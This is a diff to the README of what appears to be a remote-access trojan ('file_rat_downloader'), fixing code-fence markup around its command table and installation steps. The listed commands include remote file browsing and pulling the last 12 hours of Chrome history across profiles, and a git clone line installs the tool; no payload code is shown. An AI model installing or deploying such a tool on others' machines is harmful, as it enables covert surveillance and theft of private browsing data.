@@ -18,7 +18,7 @@ Retrieve last 12h Chrome history across profiles.
 
 Fully interactive command loop, mimicking a real remote file manager.
 
-'''bash
+```bash
 🛠 Commands
 Command	Description
 pwd	Show current directory
@@ -36,8 +36,8 @@ head <file> [n]	Show first n lines
 tail <file> [n]	Show last n lines
 history chrome	Show last 12h Chrome history
 exit	Shut down bot
+```
 
-'''bash
 ⚡ Installation
 git clone https://github.com/cmdkill3r/file_rat_downloader.git
 cd file-manager-bot
